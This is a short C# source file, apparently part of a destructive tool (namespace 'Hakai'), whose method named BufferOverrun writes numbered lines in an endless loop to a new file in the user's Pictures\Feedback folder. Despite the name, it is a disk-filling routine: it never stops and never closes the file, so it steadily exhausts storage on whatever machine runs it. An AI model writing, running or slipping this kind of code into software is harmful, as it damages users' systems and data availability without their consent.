using System.Text;

namespace Hakai
{
    public class BufferOverrun
    {
        public static void GoBufferOverrun()
        {
            string folderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "Feedback");

            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
            }
            string fileName = "f1.txt";

            for (int i = 1; File.Exists(Path.Combine(folderPath, fileName)); i++)
            {
                fileName = $"f{i + 1}.txt";
            }

            string filePath = Path.Combine(folderPath, fileName);
            File.Create(filePath).Dispose();

            FileStream fileStream = new (filePath, FileMode.Open, FileAccess.Write, FileShare.None);
            for (ulong i = 0; ; i++)
            {
                string line = $"Ligne {i + 1}\n";
                byte[] managedBuffer = Encoding.UTF8.GetBytes(line);

                fileStream.Write(managedBuffer, 0, managedBuffer.Length);
            }
            //fileStream.Close();
        }
    }
}